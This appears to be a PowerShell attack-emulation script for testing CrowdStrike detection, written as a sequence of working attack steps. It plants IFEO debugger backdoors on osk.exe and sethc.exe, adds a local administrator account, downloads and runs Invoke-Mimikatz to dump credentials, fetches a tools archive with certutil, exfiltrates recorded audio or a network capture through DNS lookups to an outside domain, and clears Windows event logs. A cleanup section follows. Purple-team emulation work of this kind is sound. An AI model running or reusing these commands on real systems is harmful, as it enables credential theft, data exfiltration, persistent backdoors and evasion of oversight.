# Powershell script for an attack emulation - Crowdstrike 
# Sould be run as administrator
# if laptop leave 1, else configure 0
# Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
# Set-ExecutionPolicy -ExecutionPolicy RemoteSigned
$laptop = 1
Write-Output "#-------------------------------------------------------------------------"
Write-Output "# Reconoissance - whoami"
whoami
Write-Output "#-------------------------------------------------------------------------"
Write-Output "# Reconoissance - systeminfo"
systeminfo
Write-Output "#-------------------------------------------------------------------------"
Write-Output "# Persistence - Registry On-Screen Keyboard (OSK)"
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v "Debugger" /t REG_SZ /d "cmd.exe" /f
Write-Output "#-------------------------------------------------------------------------"
Write-Output "# Privilege Escalation - Registry Image File Execution Options (IFEO) debugger"
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f
Write-Output "#-------------------------------------------------------------------------"
Write-Output "# Discover - Show and add user"
net user
net user /add BadActor666 SmshBgr123.
net localgroup administrators BadActor666 /add
Write-Output "#-------------------------------------------------------------------------"
Write-Output "# Credential Access - Mimikatz"
IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/7a39a55f127b1aeb951b3d9d80c6dc64500cacb5/data/module_source/credentials/Invoke-Mimikatz.ps1"); $m = Invoke-Mimikatz -DumpCreds; $m
Write-Output "#-------------------------------------------------------------------------"
Write-Output "# Download external tools and Uncompress"
cd C:\
certutil -urlcache -split -f "https://raw.githubusercontent.com/tmmdemo/thenothing/master/Tools.zip" "tools.zip"
Add-Type -A 'System.IO.Compression.FileSystem'; [IO.Compression.ZipFile]::ExtractToDirectory('C:\tools.zip', 'C:\');
Write-Output "#-------------------------------------------------------------------------"
if ($laptop -eq 1) { 
	Write-Output "# Collection and Exfiltration (if laptop) - Soundrecorder"
	Start-Process -FilePath "soundrecorder" -ArgumentList "/FILE c:\temp\output.wav /DURATION 0:0:10" -Wait
	$c = ''; $i = 0; Foreach($e in ((Get-Content -Path output.wav).ToCharArray())){ $c = $c + [System.String]::Format('{0:X}', [System.Convert]::ToUInt32($e)); if($c.length -gt 60){ write-host 'Querying '$c'.legit.hacked.net...'; nslookup $c'.legit.hacked.net' >$null 2>&1; $c = ''; if($i -gt 100){ break; } $i++; } } write-host 'Querying '$c'.legit.hacked.net...'; nslookup $c'.legit.hacked.net' >$null 2>&1;
}
else { 
	Start-Process -FilePath "netsh" -ArgumentList "trace start capture=yes tracefile=C:\capture.etl" -Wait
	Start-Process -FilePath "netsh" -ArgumentList "trace stop" -Wait
	$c = ''; $i = 0; Foreach($e in ((Get-Content -Path C:\capture.etl).ToCharArray())){ $c = $c + [System.String]::Format('{0:X}', [System.Convert]::ToUInt32($e)); if($c.length -gt 60){ write-host 'Querying '$c'.legit.hacked.net...'; nslookup $c'.legit.hacked.net' >$null 2>&1; $c = ''; if($i -gt 100){ break; } $i++; } } write-host 'Querying '$c'.legit.hacked.net...'; nslookup $c'.legit.hacked.net' >$null 2>&1;
}
Write-Output "#-------------------------------------------------------------------------"
Write-Output "# Defense Evation - wevutil (clearing logs)"
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
Write-Output "#-------------------------------------------------------------------------"
Write-Output "# Shadow copy deletion"
# vssadmin.exe Delete Shadows /All /Quiet
Write-Output "#-------------------------------------------------------------------------"
Write-Output "# Command and Control"
start AntiUsbShortCut\AntiUsb.exe "AntiUsbShortCut\AntiUsbShortCut.zip"
Write-Output "#-------------------------------------------------------------------------"
Write-Output "# Ping IOC for mapping to adversary group"
ping adobeincorp.com
Write-Output "#-------------------------------------------------------------------------"
Write-Output "# Start of Lateral Movement - ipconfig and arp"
ipconfig /all
arp -a
Write-Output "#-------------------------------------------------------------------------"
Write-Output "# Cleanup"
if ($laptop -eq 1) { 
	del C:\tools.zip 
	del C:\soundrecorder.exe 
	del C:\output.wav
	reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v "Debugger" /f
	reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v "Debugger" /f
	net user /del BadActor666
	rmdir -R C:\AntiUsbShortCut 
}
else { 
	del C:\tools.zip 
	del C:\capture.etl 
	reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v "Debugger" /f
	reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v "Debugger" /f
	net user /del BadActor666
	rmdir -R C:\AntiUsbShortCut 
}
